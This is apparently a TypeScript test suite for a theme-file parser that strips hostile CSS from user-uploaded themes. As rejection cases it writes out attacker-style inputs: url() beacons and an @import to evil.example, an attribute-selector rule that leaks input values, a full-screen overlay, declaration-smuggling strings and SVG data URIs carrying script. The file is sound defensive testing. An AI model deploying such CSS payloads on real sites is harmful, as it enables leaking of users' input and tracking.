import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {
  buildThemeCss,
  COLOR_TOKENS,
  isValidImageValue,
  isValidSizeValue,
  isValidTokenValue,
  isValidValueForToken,
  parseThemeFile,
  resolveThemeTokens,
  serializeTheme,
  THEME_TOKENS,
} from './theme-tokens';

/**
 * The parser is the security boundary for shared themes: an uploaded file must never be
 * able to put anything of its own choosing into the document. Most of these tests are
 * about what gets thrown away.
 */

test('accepts ordinary colour values', () => {
  for (const value of [
    '#fff', '#ffff', '#ff00aa', '#ff00aaee',
    'rgb(255, 0, 128)', 'rgba(255,0,128,0.5)', 'rgb(255 0 128 / 50%)',
    'hsl(210, 50%, 40%)', 'hsla(210 50% 40% / 0.3)',
    'transparent', 'white', 'CurrentColor',
  ]) {
    assert.equal(isValidTokenValue(value), true, `${value} should be accepted`);
  }
});

test('rejects anything that is not purely a colour', () => {
  for (const value of [
    'url(https://evil.example/pixel.png)',
    "url('https://evil.example/x')",
    '#fff; background: url(https://evil.example/x)',
    'red } body { display: none } .x {',
    'var(--something)',
    'expression(alert(1))',
    'image-set("a.png" 1x)',
    '#fff /* comment */',
    'attr(data-x)',
    'linear-gradient(red, blue)',
    '',
    '   ',
    '#'.repeat(80),
  ]) {
    assert.equal(isValidTokenValue(value), false, `${value.slice(0, 40)} should be rejected`);
  }
});

test('reads metadata and tokens from a well-formed file', () => {
  const { theme, errors } = parseThemeFile(`
    /*
     * @name Cherry Blossom
     * @author Someone
     * @scheme light
     */
    :root {
      --bg: #fff5f7;
      --surface: #ffffff;
      --text-primary: #4a2c38;
      --accent: #d13a72;
    }
  `);

  assert.deepEqual(errors, []);
  assert.ok(theme);
  assert.equal(theme.name, 'Cherry Blossom');
  assert.equal(theme.author, 'Someone');
  assert.equal(theme.scheme, 'light');
  assert.equal(theme.id, 'cherry-blossom');
  assert.equal(theme.tokens['--bg'], '#fff5f7');
});

test('strips hostile declarations but keeps the good ones', () => {
  const { theme, warnings } = parseThemeFile(`
    /* @name Trojan */
    @import url('https://evil.example/steal.css');
    :root {
      --bg: #101010;
      --surface: #202020;
      --text-primary: #ffffff;
      --accent: url(https://evil.example/track?v=1);
      --danger: #ff0000; }
    input[value^="a"] { background: url(https://evil.example/leak?c=a); }
    .cc-btn-primary { position: fixed; inset: 0; z-index: 99999; }
  `);

  assert.ok(theme);
  // The colour tokens survive.
  assert.equal(theme.tokens['--bg'], '#101010');
  assert.equal(theme.tokens['--danger'], '#ff0000');
  // The exfiltration attempt does not.
  assert.equal(theme.tokens['--accent'], undefined);
  assert.ok(warnings.some((w) => /@import/i.test(w)), 'the @import should be reported');
  assert.ok(warnings.some((w) => /url\(\)/i.test(w)), 'the url() should be reported');

  // Nothing the file chose can reach the generated stylesheet.
  const css = buildThemeCss(theme);
  assert.ok(!css.includes('evil.example'));
  assert.ok(!css.includes('position'));
  assert.ok(!css.includes('@import'));
  assert.ok(!css.includes('z-index'));
});

test('the generated stylesheet only ever contains known tokens', () => {
  const { theme } = parseThemeFile(`
    /* @name Odd */
    :root { --bg: #111; --totally-made-up: #222; --surface: #333; --text-primary: #fff; --accent: #0f0; }
  `);

  assert.ok(theme);
  const css = buildThemeCss(theme);
  assert.ok(!css.includes('totally-made-up'));

  for (const line of css.split('\n').slice(2, -1)) {
    const prop = line.trim().split(':')[0];
    assert.ok(THEME_TOKENS.includes(prop as never), `${prop} is not an allowed token`);
  }
});

test('rejects a file with no usable tokens', () => {
  const { theme, errors } = parseThemeFile('body { color: red; }');
  assert.equal(theme, null);
  assert.ok(errors.length > 0);

  assert.equal(parseThemeFile('').theme, null);
  assert.equal(parseThemeFile('x'.repeat(70 * 1024)).theme, null);
});

test('warns about missing essentials but still imports', () => {
  const { theme, warnings } = parseThemeFile('/* @name Partial */ :root { --accent: #ff0000; }');
  assert.ok(theme);
  assert.ok(warnings.some((w) => w.includes('--bg')));
});

test('a partial theme resolves to the full token set', () => {
  const { theme } = parseThemeFile('/* @name Partial */ /* @scheme light */ :root { --accent: #ff0000; }');
  assert.ok(theme);

  const resolved = resolveThemeTokens(theme);
  assert.equal(resolved['--accent'], '#ff0000', 'the declared token wins');
  assert.equal(resolved['--bg'], '#f4f6fa', 'the light base fills in the rest');
  for (const token of COLOR_TOKENS) {
    assert.ok(resolved[token], `${token} should be resolved`);
  }
  // Decoration is opt-in: a theme that asks for none gets none.
  assert.equal(resolved['--bg-image'], undefined);
});

test('a theme survives an export and re-import unchanged', () => {
  const original = parseThemeFile(`
    /* @name Round Trip */
    /* @author Tester */
    /* @scheme light */
    :root { --bg: #fff5f7; --surface: #ffffff; --text-primary: #4a2c38; --accent: #d13a72; }
  `).theme;
  assert.ok(original);

  const reimported = parseThemeFile(serializeTheme(original)).theme;
  assert.ok(reimported);
  assert.equal(reimported.name, original.name);
  assert.equal(reimported.author, original.author);
  assert.equal(reimported.scheme, original.scheme);
  assert.equal(reimported.tokens['--accent'], original.tokens['--accent']);
});

/* ── Background decoration ─────────────────────────────────────────────────── */

test('accepts embedded images and rejects every off-box reference', () => {
  const svg = "url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E\")";
  assert.equal(isValidImageValue(svg), true);
  assert.equal(isValidImageValue('url("data:image/png;base64,iVBORw0KGgo=")'), true);
  assert.equal(isValidImageValue('none'), true);

  for (const value of [
    'url(https://evil.example/petals.png)',
    'url("//evil.example/x.png")',
    'url(/local/path.png)',
    'url("data:text/html,<h1>hi</h1>")',
    'url("data:image/svg+xml,%3Csvg onload=%22alert(1)%22%3E%3C/svg%3E")',
    'url("data:image/svg+xml,%3Cscript%3Ealert(1)%3C/script%3E")',
    'url("data:image/svg+xml,x"); background: url(https://evil.example/y',
  ]) {
    assert.equal(isValidImageValue(value), false, `${value.slice(0, 50)} should be rejected`);
  }
});

test('background-size accepts lengths and keywords only', () => {
  for (const v of ['240px', '50%', 'cover', 'contain', 'auto', '240px 240px', '10rem auto']) {
    assert.equal(isValidSizeValue(v), true, `${v} should be accepted`);
  }
  for (const v of ['calc(100% - 10px)', '240', 'url(x)', '1px 2px 3px', 'expression(1)']) {
    assert.equal(isValidSizeValue(v), false, `${v} should be rejected`);
  }
});

test('background animation is limited to the built-in motions', () => {
  for (const v of ['none', 'drift', 'fall', 'FALL']) {
    assert.equal(isValidValueForToken('--bg-animation', v), true, `${v} should be accepted`);
  }
  for (const v of ['spin', 'my-keyframes', '1s linear infinite', 'fall, drift']) {
    assert.equal(isValidValueForToken('--bg-animation', v), false, `${v} should be rejected`);
  }
});

test('a colour value is not accepted where an image belongs, or vice versa', () => {
  assert.equal(isValidValueForToken('--bg-image', '#ff0000'), false);
  assert.equal(isValidValueForToken('--bg', 'url("data:image/png;base64,iVBORw0KGgo=")'), false);
});

test('the shipped Meadow Light file parses cleanly and keeps its artwork', () => {
  const file = fs.readFileSync(path.join(process.cwd(), 'themes/meadow-light.css'), 'utf8');
  const { theme, errors, warnings } = parseThemeFile(file);

  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
  assert.ok(theme);
  assert.equal(theme.name, 'Meadow Light');
  // The light-scheme counterpart to the Sakura Night case below: a light theme has to keep
  // its decoration through validation just as a dark one does.
  assert.equal(theme.scheme, 'light');
  assert.equal(theme.tokens['--bg-animation'], 'drift');
  assert.equal(theme.tokens['--bg-size'], '480px');
  assert.ok(theme.tokens['--bg-image']?.startsWith('url("data:image/svg+xml,'));
  assert.ok(theme.tokens['--bg-scene']?.startsWith('url("data:image/svg+xml,'));

  // The artwork survives into the generated stylesheet, and nothing else does.
  const css = buildThemeCss(theme);
  assert.ok(css.includes('data:image/svg+xml'));
  assert.ok(!/url\(\s*['"]?https?:/i.test(css));
});

test('the shipped Sakura Night file parses cleanly and is dark', () => {
  const file = fs.readFileSync(path.join(process.cwd(), 'themes/sakura-night.css'), 'utf8');
  const { theme, errors, warnings } = parseThemeFile(file);

  assert.deepEqual(errors, []);
  assert.deepEqual(warnings, []);
  assert.ok(theme);
  assert.equal(theme.name, 'Sakura Night');
  assert.equal(theme.scheme, 'dark');
  assert.equal(theme.tokens['--bg-animation'], 'fall');
  assert.ok(theme.tokens['--bg-image']?.startsWith('url("data:image/svg+xml,'));
  // The still layer carries the moon and boughs; it must survive validation too.
  assert.ok(theme.tokens['--bg-scene']?.startsWith('url("data:image/svg+xml,'));
  assert.equal(theme.tokens['--bg-size'], '480px');

  // A dark theme's page ground must actually be dark, or the light base would leak in.
  const bg = theme.tokens['--bg'];
  assert.ok(bg && /^#0[0-9a-f]/i.test(bg), `expected a very dark --bg, got ${bg}`);
});

test('an embedded image does not mask an external url elsewhere in the file', () => {
  // The scan strips data: payloads first, because an SVG contains its own url(#gradient)
  // references. That must not become a way to smuggle a real request past the check.
  const { warnings } = parseThemeFile(`
    /* @name Sneaky */
    :root {
      --bg: #101010;
      --surface: #202020;
      --text-primary: #ffffff;
      --accent: #ff0000;
      --bg-scene: url("data:image/svg+xml,%3Csvg%3E%3Crect fill='url(%23grad)'/%3E%3C/svg%3E");
    }
    .x { background: url(https://evil.example/beacon.png); }
  `);

  assert.ok(
    warnings.some((w) => /external url/i.test(w)),
    'the external reference must still be reported'
  );
});

test('an illustrated theme reports no external url at all', () => {
  const { warnings } = parseThemeFile(`
    /* @name Clean */
    :root {
      --bg: #101010;
      --surface: #202020;
      --text-primary: #ffffff;
      --accent: #ff0000;
      --bg-scene: url("data:image/svg+xml,%3Csvg%3E%3Crect fill='url(%23grad)'/%3E%3C/svg%3E");
    }
  `);

  assert.deepEqual(warnings, []);
});
